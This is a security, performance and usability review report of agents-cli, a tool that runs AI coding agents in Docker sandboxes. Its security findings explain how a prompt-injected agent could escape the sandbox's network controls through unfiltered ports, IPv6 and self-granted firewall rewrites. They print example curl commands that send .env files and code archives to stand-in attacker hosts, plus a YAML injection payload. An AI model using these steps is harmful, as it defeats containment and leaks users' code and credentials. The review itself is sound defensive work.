# Adversarial Codebase Review — agents-cli

**Date**: 2026-03-11
**Reviewers**: 3 independent adversarial agents (Security, Performance, DX)
**Scope**: Entire codebase (all source files, Docker assets, dashboard, config)
**Total findings**: 63 (18 security + 15 performance + 25 DX + 5 cross-cutting dedupes)

---

## Executive Summary

The sandbox has **fundamental security flaws** — the firewall default policy is inverted (allows all traffic except ports 80/443), IPv6 is completely unfiltered, and the agent retains `NET_ADMIN` capability to rewrite its own rules. The proxy security layer is effectively decorative. On the performance side, the Docker log parser uses quadratic buffer concatenation, SSE streams leak on client disconnect, and temp directories accumulate forever. DX-wise, new users will hit a wall immediately — no Docker availability check, no API key validation, and cryptic errors on failure.

---

## Combined Findings by Priority

### P0 — Fix Before Anyone Uses This

| ID | Domain | Severity | Title | Location |
|----|--------|----------|-------|----------|
| SEC-003 | Security | **HIGH** | Firewall default policy is ACCEPT — agent can connect to any port except 80/443, bypassing proxy entirely | `init-firewall.sh:27-30` |
| SEC-002 | Security | **HIGH** | No IPv6 rules at all — complete sandbox bypass via IPv6 | `init-firewall.sh` |
| SEC-015 | Security | **HIGH** | Agent keeps `NET_ADMIN` — can `iptables -F` and drop all rules | `compose.ts:71-72` |
| SEC-001 | Security | **HIGH** | YAML injection via string interpolation in compose generation — `--name` with newline injects `privileged: true` | `compose.ts:40-103` |
| SEC-009 | Security | **MEDIUM** | Dashboard binds `0.0.0.0` with zero auth — anyone on LAN sees agent logs | `server.ts:46-48` |

**The sandbox is broken.** The firewall allows outbound on 65,533 ports. IPv6 is wide open. The agent can rewrite its own firewall. Combined, a prompt-injected agent can exfiltrate the entire codebase in one `curl` command on port 8080.

### P1 — High-Impact Issues

| ID | Domain | Severity | Title | Location |
|----|--------|----------|-------|----------|
| SEC-004 | Security | HIGH | DNS rebinding bypasses proxy — proxy connects to private IPs (cloud metadata) on agent's behalf | `init-firewall.sh`, `block-write-methods.py` |
| SEC-008 | Security | MEDIUM | Entire `~/.claude` directory mounted and copied — full credential exposure to agent | `compose.ts:77`, `entrypoint.sh:26-30` |
| PERF-001 | Perf | CRITICAL | `Buffer.concat` on every log chunk — O(n²) for long sessions | `docker.ts:73-84` |
| PERF-003 | Perf | HIGH | SSE streams never detect client disconnect — zombie streams accumulate | `server.ts:82-111` |
| PERF-005 | Perf | HIGH | Two independent Docker log streams per container (background + SSE) | `server.ts:96,159` |
| DX-001 | DX | CRITICAL | No Docker availability check — raw `ECONNREFUSED` stack trace | `docker.ts:4` |
| DX-002 | DX | CRITICAL | No `ANTHROPIC_API_KEY` validation — 2-minute image build then immediate failure | `launch.ts`, `compose.ts:107` |
| DX-005 | DX | HIGH | No `stop` command — only nuclear `clean` that kills everything | CLI behavior |

### P2 — Should Fix

| ID | Domain | Severity | Title | Location |
|----|--------|----------|-------|----------|
| SEC-005 | Security | MEDIUM | Temp files created world-readable (default umask) | `compose.ts:120-126` |
| SEC-006 | Security | MEDIUM | Config dir/file written with `0755`/`0644` | `config.ts:30-32` |
| SEC-007 | Security | MEDIUM | Docker label spoofing — any container can impersonate a managed agent | `docker.ts:25-27` |
| SEC-010 | Security | MEDIUM | Unbounded buffer in log parser — malformed frame header causes OOM | `docker.ts:73-84` |
| PERF-002 | Perf | HIGH | Temp directories never cleaned up — ~20KB leak per launch | `compose.ts:120`, `image.ts:46` |
| PERF-004 | Perf | HIGH | `statsMap` + `tracking` Set grow without bound | `server.ts:16,138` |
| PERF-007 | Perf | MEDIUM | No signal forwarding — Ctrl+C orphans proxy containers | `compose.ts:161-194` |
| PERF-009 | Perf | MEDIUM | Client polls every 5s + server polls every 10s — 18+ Docker API calls/min | `index.html:485`, `server.ts:176` |
| DX-003 | DX | HIGH | Image build: no size warning, useless error on failure | `image.ts:43-56` |
| DX-004 | DX | HIGH | `config` doesn't show available keys or mark defaults | `config.ts:9-14` |
| DX-006 | DX | HIGH | `resume` with bad ID: no suggestion to run `list` | `compose.ts:222-225` |
| DX-008 | DX | MEDIUM | No completion summary after non-interactive agent run | `compose.ts:188-194` |
| DX-010 | DX | MEDIUM | Dashboard port accepts `NaN` without validation | `dashboard.ts:8` |
| DX-011 | DX | MEDIUM | `list` table wraps on 80-col terminals | `list.ts:16-19` |
| DX-014 | DX | MEDIUM | `config set` accepts any value — invalid model/path silently saved | `config.ts:19-28` |
| DX-015 | DX | MEDIUM | Dashboard empty state gives zero guidance | `index.html:265` |

### P3 — Polish

| ID | Domain | Title |
|----|--------|-------|
| SEC-012 | Security | Unpinned Docker base images + `curl \| sh` install |
| SEC-013 | Security | `@types/bun` uses `"latest"` tag |
| SEC-014 | Security | `--dangerously-skip-permissions` is unconditional |
| SEC-016 | Security | Proxy explicitly allows `CONNECT` method |
| SEC-017 | Security | Temp dirs never cleaned (overlap with PERF-002) |
| SEC-018 | Security | SSE endpoint accepts any container ID without label check |
| PERF-006 | Perf | Image hash recomputed every call (should be const) |
| PERF-008 | Perf | Sync file I/O in launch path |
| PERF-010 | Perf | Unnecessary `Buffer.from(chunk)` copy |
| PERF-011 | Perf | Eager import of all commands at startup |
| PERF-013 | Perf | 4 redundant `docker inspect` calls in resume path |
| DX-009 | DX | `--explain` is a hidden flag, not a command |
| DX-012 | DX | No command aliases (`ps`, `dash`, `ui`) |
| DX-013 | DX | `logs` with bad ID gives raw Docker API error |
| DX-016 | DX | `resume` doesn't handle `created`/`paused` states |
| DX-017 | DX | Output path default differs between `launch` and `resume` |
| DX-018 | DX | Version hardcoded in two places |
| DX-019 | DX | `clean` doesn't remove the ~2GB sandbox image |
| DX-020 | DX | Compose YAML breaks on paths with colons (Windows) |
| DX-021-025 | DX | Minor: `-V` flag, SSE reconnect, model display, shell cmd, inconsistent feedback |

### Positive Findings

| ID | Title |
|----|-------|
| SEC-019 | Dashboard XSS properly mitigated — `esc()` function is correct |
| SEC-020 | Bun `$` template literals prevent shell injection |

---

## Detailed Findings

### Security (The Paranoid)

#### SEC-001 | HIGH | YAML Injection via Unsanitized User Inputs in Compose YAML

**Location**: `src/lib/compose.ts:40-103`

The `generateComposeYaml` function builds a Docker Compose YAML document via raw string interpolation. Values for `opts.codebasePath`, `opts.outputPath`, `opts.name`, `opts.model`, and other user-controlled inputs are spliced directly into YAML structure with zero sanitization or escaping.

The label injection on line 92 is particularly dangerous:

```typescript
- com.agents-cli.launched=${timestamp}${opts.name ? `\n      - com.agents-cli.name=${opts.name}` : ""}
```

A newline in `opts.name` directly injects new YAML lines into the service definition.

**Attack scenario**: A user passes `--name $'evil\n    privileged: true'`. The resulting YAML inserts `privileged: true` into the agent service block. A codebase path containing `:/host-root:rw` could alter the volume mount from read-only to read-write.

**Recommendation**: Build the compose structure as a JavaScript object and serialize it with a YAML library (e.g., `yaml` or `js-yaml`). At minimum, validate all interpolated values against a strict regex.

---

#### SEC-002 | HIGH | No IPv6 Firewall Rules — Complete Sandbox Network Bypass

**Location**: `src/assets/init-firewall.sh` (entire file)

The firewall script uses only `iptables`, which applies exclusively to IPv4 traffic. There is not a single `ip6tables` rule anywhere. All IPv6 traffic flows freely — no proxy interception, no method filtering, no restrictions whatsoever.

**Attack scenario**: The agent runs `curl -6 'http://[::1]:8080/admin'` or `curl -6 --data @/workspace/.env http://[attacker-ipv6]:9999/exfil`.

**Recommendation**: Add a blanket IPv6 deny policy or disable IPv6 entirely via sysctl:
```yaml
sysctls:
  - net.ipv6.conf.all.disable_ipv6=1
```

---

#### SEC-003 | HIGH | Agent Can Bypass Proxy via Direct Connections on Non-Standard Ports

**Location**: `src/assets/init-firewall.sh:27-30`

The firewall logic is fundamentally inverted. Lines 27-28 block outbound TCP to ports 80 and 443. Line 30 then accepts all remaining traffic (`-j ACCEPT`). The agent can make direct TCP connections to any public IP on any port other than 80 and 443.

```bash
iptables -A OUTPUT -p tcp --dport 80 -j DROP
iptables -A OUTPUT -p tcp --dport 443 -j DROP
iptables -A OUTPUT -j ACCEPT          # <-- allows everything else
```

**Attack scenario**: `curl http://attacker.com:8080/ --upload-file /tmp/code.tar.gz` — direct connection, no proxy, no method filter.

**Recommendation**: Invert the default policy to DROP:
```bash
iptables -P OUTPUT DROP
iptables -A OUTPUT -o lo -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -p udp --dport 53 -d 127.0.0.11 -j ACCEPT
iptables -A OUTPUT -p tcp -d "$PROXY_IP" --dport "$PROXY_PORT" -j ACCEPT
```

---

#### SEC-004 | HIGH | Proxy Bypass via DNS Rebinding

**Location**: `src/assets/init-firewall.sh:14-15` and `src/assets/block-write-methods.py`

When the agent makes an HTTP request through the proxy, the proxy performs its own DNS resolution. The proxy runs in a separate container with no iptables restrictions. DNS rebinding can trick the proxy into connecting to private IPs (e.g., `169.254.169.254` for cloud metadata).

**Recommendation**: Add `--set block_private=true` to the mitmproxy command in the compose YAML.

---

#### SEC-005 | MEDIUM | Temp Files Created with Default Permissions (World-Readable)

**Location**: `src/lib/compose.ts:120-126` and `src/lib/image.ts:46-49`

`writeFileSync` creates files with default umask permissions (typically `0644`).

**Recommendation**: `writeFileSync(path, content, { mode: 0o600 })`.

---

#### SEC-006 | MEDIUM | Config File and Directory Written with Default Permissions

**Location**: `src/lib/config.ts:30-32`

**Recommendation**:
```typescript
mkdirSync(CONFIG_DIR, { recursive: true, mode: 0o700 });
writeFileSync(CONFIG_PATH, JSON.stringify(config, null, 2) + "\n", { mode: 0o600 });
```

---

#### SEC-007 | MEDIUM | Docker Label Spoofing

**Location**: `src/lib/docker.ts:25-27`

All container management operations identify containers solely by the label `com.agents-cli.managed=true`. Any process with Docker access can create containers with this label.

**Recommendation**: Add HMAC-based label verification or track container IDs in a local state file.

---

#### SEC-008 | MEDIUM | Claude Config Directory — Full Credential Exposure

**Location**: `src/lib/compose.ts:77`, `src/assets/entrypoint.sh:26-30`

The user's entire `~/.claude` directory is mounted read-only then copied wholesale. The agent has full read access to API keys, session tokens, etc.

**Recommendation**: Mount only the specific files Claude CLI needs, not the entire directory.

---

#### SEC-009 | MEDIUM | Dashboard Binds to All Interfaces Without Authentication

**Location**: `src/dashboard/server.ts:46-48`

**Recommendation**: `Bun.serve({ port, hostname: "127.0.0.1" })`.

---

#### SEC-010 | MEDIUM | Unbounded Buffer Growth in Docker Log Stream Parser

**Location**: `src/lib/docker.ts:73-84`

If a frame header declares a size of 2GB, the loop waits for that much data to accumulate.

**Recommendation**: Add a maximum buffer size (e.g., 16MB). Reject frames larger than a reasonable threshold.

---

#### SEC-011 | LOW | Stats Map and Tracking Set Grow Without Bound

**Location**: `src/dashboard/server.ts:16`, `server.ts:137-177`

**Recommendation**: Evict entries for containers done for >1 hour.

---

#### SEC-012 | LOW | Unpinned Docker Base Images and curl-pipe-sh Installation

**Location**: `src/assets/Dockerfile:1,14`, `src/lib/compose.ts:53`

- `FROM node:22-bookworm` — no digest pin
- `curl -LsSf https://astral.sh/uv/install.sh | sh` — no checksum
- `npm install -g @anthropic-ai/claude-code agent-browser` — no version pin
- `mitmproxy/mitmproxy:11` — major version tag

**Recommendation**: Pin all to SHA256 digests and exact versions.

---

#### SEC-013 | LOW | `@types/bun` Uses `latest` Tag

**Location**: `package.json:19`

**Recommendation**: Pin to a specific version range.

---

#### SEC-014 | LOW | `--dangerously-skip-permissions` Unconditional

**Location**: `src/lib/compose.ts:147`, `src/assets/Dockerfile:43`

**Recommendation**: Document as explicit risk. Consider restricted mode for some use cases.

---

#### SEC-015 | LOW | `NET_ADMIN` Allows Agent to Rewrite Firewall Rules

**Location**: `src/lib/compose.ts:71-72`

The agent can use `iptables -F` or netlink sockets to remove all firewall rules.

**Recommendation**: Drop capabilities after entrypoint: `capsh --drop=cap_net_admin,cap_net_raw -- -c "exec claude ..."`.

---

#### SEC-016 | LOW | Proxy Filter Allows `CONNECT` Method

**Location**: `src/assets/block-write-methods.py:5`

**Recommendation**: Remove `CONNECT` from `ALLOWED_METHODS`.

---

#### SEC-017 | INFO | Temp Directories Never Cleaned Up

(Overlaps with PERF-002)

---

#### SEC-018 | INFO | Dashboard SSE Endpoint Accepts Arbitrary Container IDs

**Location**: `src/dashboard/server.ts:82-83`

**Recommendation**: Validate container has `com.agents-cli.managed=true` label before streaming.

---

#### SEC-019 | INFO | Dashboard XSS Properly Mitigated (Positive)

The `esc()` function correctly escapes HTML via `textContent`/`innerHTML` pattern.

---

#### SEC-020 | INFO | Bun `$` Template Literals Prevent Shell Injection (Positive)

Bun's `$` tagged template literal automatically escapes interpolated values.

---

### Performance (The Profiler)

#### PERF-001 | CRITICAL | Unbounded Buffer Concatenation in Log Stream Hot Path

**Location**: `src/lib/docker.ts:73-84`

`Buffer.concat` on every incoming chunk is O(n) copy of entire buffer — quadratic for long sessions. `subarray` calls prevent GC of original buffer.

**Impact**: 50MB log session = O(n²) copies. After 30 min at ~10KB/s, copying 18MB per chunk.

**Recommendation**: Use a buffer list or track offset instead of subarray views.

---

#### PERF-002 | HIGH | Temp Directories Never Cleaned Up

**Location**: `src/lib/compose.ts:120-122`, `src/lib/image.ts:46`

~20KB leaked per launch. Accumulates indefinitely in `/tmp`.

**Recommendation**: `try/finally` with `rmSync` for build dir. Process exit handler for compose dir.

---

#### PERF-003 | HIGH | SSE Stream Never Detects Client Disconnect

**Location**: `src/dashboard/server.ts:82-111`

Closed browser tabs leave zombie streams: Docker log stream, growing buffer, CPU cycles.

**Recommendation**: Check `req.signal` for abort, add `cancel` callback to `ReadableStream`.

---

#### PERF-004 | HIGH | statsMap Grows Without Bound

**Location**: `src/dashboard/server.ts:16`

Entries added but never removed. `tracking` Set also grows unboundedly.

**Recommendation**: Prune entries for containers done >1 hour. Reconcile against Docker periodically.

---

#### PERF-005 | HIGH | Duplicate Docker Log Streams per Container

**Location**: `src/dashboard/server.ts:96-100,159`

Background `collectAgentStats` + SSE endpoint each open independent streams. 2x CPU/memory per container.

**Recommendation**: Pub/sub pattern — single consumer broadcasts to SSE subscribers.

---

#### PERF-006 | MEDIUM | Image Hash Recomputed on Every Call

**Location**: `src/lib/image.ts:22-28`

Assets are compile-time constants. Hash is deterministic.

**Recommendation**: Compute once at module load as a const.

---

#### PERF-007 | MEDIUM | No Signal Forwarding to Spawned Docker Processes

**Location**: `src/lib/compose.ts:161-194`

Ctrl+C kills parent but orphans Docker Compose project (proxy container keeps running).

**Recommendation**: Register SIGINT/SIGTERM handlers that forward to child process.

---

#### PERF-008 | MEDIUM | Synchronous File I/O in Launch Path

**Location**: `src/lib/compose.ts:119-126`, `src/lib/config.ts:19-21`

`mkdtempSync`, `writeFileSync`, `readFileSync` block event loop. Low impact for CLI, medium if called from dashboard.

**Recommendation**: Use `Bun.write` and `fs/promises` variants.

---

#### PERF-009 | MEDIUM | Dashboard Polls Docker API Every 5s (Client) + 10s (Server)

**Location**: `src/dashboard/index.html:485`, `src/dashboard/server.ts:176`

18+ Docker API calls/min with 1 tab. 42+/min with 3 tabs.

**Recommendation**: Cache `listAgentContainers` result server-side with 3s TTL.

---

#### PERF-010 | MEDIUM | `Buffer.from(chunk)` Unnecessary Copy

**Location**: `src/lib/docker.ts:76`

Copies buffer even when chunk is already a Buffer. Doubles memory allocation per chunk.

**Recommendation**: `Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk)`.

---

#### PERF-011 | LOW | Eager Import of All Commands at Startup

**Location**: `src/cli.ts:2-10`

All commands imported even for `--version` or `config`. ~50-100ms cold start overhead.

**Recommendation**: Dynamic imports in Commander action handlers.

---

#### PERF-012 | LOW | `stdin.once("data")` Hangs Forever Without Timeout

**Location**: `src/commands/clean.ts:21-23`

Process hangs in automated/CI contexts if no stdin data arrives.

**Recommendation**: Add 30s timeout via `Promise.race`.

---

#### PERF-013 | LOW | Redundant `docker inspect` Calls in Resume Path

**Location**: `src/commands/resume.ts:51,60`, `src/lib/compose.ts:222`

4 Docker API round-trips when 1 would suffice. ~20-40ms wasted.

**Recommendation**: Fetch once and extract all needed fields.

---

#### PERF-014 | LOW | `typeof chunk === "number"` Branch is Dead Code

**Location**: `src/lib/docker.ts:76`

Docker streams never yield numbers. Dead branch on every iteration.

**Recommendation**: Remove number branch. Assert `AsyncIterable<Buffer>`.

---

#### PERF-015 | INFO | Global Dockerode Instance Created at Import Time

**Location**: `src/lib/docker.ts:3`

Commands that don't need Docker (config, explain) still connect to Docker socket.

**Recommendation**: Lazy initialization via getter function.

---

### DX / Usability (The Frustrated Developer)

#### DX-001 | CRITICAL | No Check for Docker Daemon Availability

**Location**: `src/lib/docker.ts:4`, `src/lib/image.ts:38`

User gets raw `ECONNREFUSED` stack trace when Docker isn't running.

**Recommendation**: Add `ensureDocker()` utility:
```typescript
try { await docker.ping(); } catch {
  console.error("Error: Cannot connect to Docker. Is Docker running?");
  process.exit(1);
}
```

---

#### DX-002 | CRITICAL | No ANTHROPIC_API_KEY Validation Before Launch

**Location**: `src/commands/launch.ts`, `src/lib/compose.ts:107`

2-minute image build wasted when API key is missing.

**Recommendation**: Check for `ANTHROPIC_API_KEY` before building image. Fail fast.

---

#### DX-003 | HIGH | Image Build Has No Progress Indication

**Location**: `src/lib/image.ts:43-56`

"Building sandbox image..." with no indication it downloads ~2GB. On failure: "Failed to build sandbox image" with no diagnostics.

**Recommendation**: Add context message and print build output on failure.

---

#### DX-004 | HIGH | `config` Doesn't Show Available Keys or Mark Defaults

**Location**: `src/commands/config.ts:9-14`

No way to discover available keys without reading source code. No `config get`, `config list`, or `config reset`.

**Recommendation**: Show keys with default markers. Add subcommands.

---

#### DX-005 | HIGH | No `stop` Command

**Location**: CLI behavior

Only option is `clean` which kills all containers. No way to stop a single agent.

**Recommendation**: Add `agents-cli stop [container-id]`.

---

#### DX-006 | HIGH | `resume` with Bad ID Gives No Guidance

**Location**: `src/lib/compose.ts:222-225`

**Recommendation**: `"Container 'abc123' not found. Run 'agents-cli list' to see available containers."`

---

#### DX-007 | HIGH | Temp Directories Never Cleaned Up

(Overlaps with PERF-002)

---

#### DX-008 | MEDIUM | No Completion Summary After Non-Interactive Run

**Location**: `src/lib/compose.ts:188-194`

Agent finishes and CLI exits silently. No indication of where output was saved.

**Recommendation**: Print `"Agent finished. Output: <output-path>"`.

---

#### DX-009 | MEDIUM | `--explain` Is a Hidden Flag, Not a Command

**Location**: `src/cli.ts:16,27-31`

Not discoverable in `--help` output.

**Recommendation**: Make it a proper command: `agents-cli explain`.

---

#### DX-010 | MEDIUM | Dashboard Port Accepts NaN

**Location**: `src/commands/dashboard.ts:8`

`parseInt("banana")` → NaN → `Bun.serve({ port: NaN })`.

**Recommendation**: Validate port is 1-65535.

---

#### DX-011 | MEDIUM | `list` Table Wraps on 80-Col Terminals

**Location**: `src/commands/list.ts:16-19`

116-char header width. Unreadable when wrapped.

**Recommendation**: Detect terminal width or use compact default format.

---

#### DX-012 | MEDIUM | No Command Aliases Beyond `list`/`ls`

**Recommendation**: Add `ps` for list, `dash`/`ui` for dashboard.

---

#### DX-013 | MEDIUM | `logs` with Bad ID Gives Raw Docker API Error

**Location**: `src/lib/docker.ts:60-61`

**Recommendation**: Catch and suggest `agents-cli list`.

---

#### DX-014 | MEDIUM | `config set` Accepts Any Value Without Validation

**Location**: `src/commands/config.ts:19-28`

Invalid model names and nonexistent paths silently saved.

**Recommendation**: Validate paths exist. Warn on non-claude model names.

---

#### DX-015 | MEDIUM | Dashboard Empty State Gives Zero Guidance

**Location**: `src/dashboard/index.html:265`

**Recommendation**: Show `"No agents found. Launch one with: agents-cli launch . -p 'your prompt'"`.

---

#### DX-016 | MEDIUM | `resume` Doesn't Handle `created`/`paused` States

**Location**: `src/lib/compose.ts:229-231`

Only checks for `exited`. Other non-running states cause exec failure.

**Recommendation**: Start container for any non-running state. Error on `dead`.

---

#### DX-017 | LOW | Output Path Default Differs Between `launch` and `resume`

**Location**: `src/commands/launch.ts:10` vs `src/commands/resume.ts:13`

**Recommendation**: Warn if inference fails. Default to `./agent-output`.

---

#### DX-018 | LOW | Version Hardcoded in Two Places

**Location**: `src/cli.ts:15`, `package.json:3`

**Recommendation**: Import version from `package.json`.

---

#### DX-019 | LOW | `clean` Doesn't Remove Sandbox Docker Image

**Recommendation**: Add `--images` flag to also remove `agents-cli-sandbox:*`.

---

#### DX-020 | LOW | Compose YAML Breaks on Paths with Colons

**Location**: `src/lib/compose.ts:40-103`

Windows paths with `:` break volume mounts in generated YAML.

**Recommendation**: Use YAML library or quote interpolated values.

---

#### DX-021 | LOW | No `--version` Short Flag

**Recommendation**: Add `-V` via `.version("0.1.0", "-V, --version")`.

---

#### DX-022 | LOW | Dashboard SSE Never Reconnects on Disconnect

**Location**: `src/dashboard/index.html:383-385`

**Recommendation**: Add automatic reconnection with exponential backoff.

---

#### DX-023 | INFO | `launch` Doesn't Show Which Model Is Being Used

**Recommendation**: Print `"Launching agent with model claude-sonnet-4-6..."`.

---

#### DX-024 | INFO | No `shell` Command to Attach to Running Container

**Recommendation**: Add `agents-cli shell [container-id]` → `docker exec -it <id> bash`.

---

#### DX-025 | INFO | Inconsistent Feedback When Auto-Selecting Container

**Recommendation**: Both `logs` and `resume` should print name + short ID in same format.

---

## Recommended Fix Order

**Week 1 — Sandbox is broken:**
1. Invert firewall to `DROP` default policy (SEC-003) — ~10 lines changed
2. Add `ip6tables -P OUTPUT DROP` or disable IPv6 via sysctl (SEC-002) — ~3 lines
3. Drop `NET_ADMIN`/`NET_RAW` after entrypoint firewall setup (SEC-015) — use `capsh --drop`
4. Build compose YAML as object + serialize with YAML lib (SEC-001) — medium effort
5. Bind dashboard to `127.0.0.1` (SEC-009) — 1 line

**Week 2 — First-run experience:**
6. Add `ensureDocker()` check (DX-001) — ~10 lines
7. Validate `ANTHROPIC_API_KEY` before launch (DX-002) — ~5 lines
8. Add `stop` command (DX-005) — ~30 lines
9. Improve error messages with `list` suggestions (DX-006, DX-013) — ~10 lines
10. Add `--set block_private=true` to mitmproxy (SEC-004) — 1 line

**Week 3 — Performance & cleanup:**
11. Rewrite log buffer parser to avoid O(n²) concat (PERF-001) — ~30 lines
12. Add SSE disconnect detection (PERF-003) — ~15 lines
13. Pub/sub for log streams to eliminate duplicates (PERF-005) — ~50 lines
14. Temp directory cleanup with `try/finally` (PERF-002) — ~10 lines
15. Signal forwarding to child processes (PERF-007) — ~10 lines
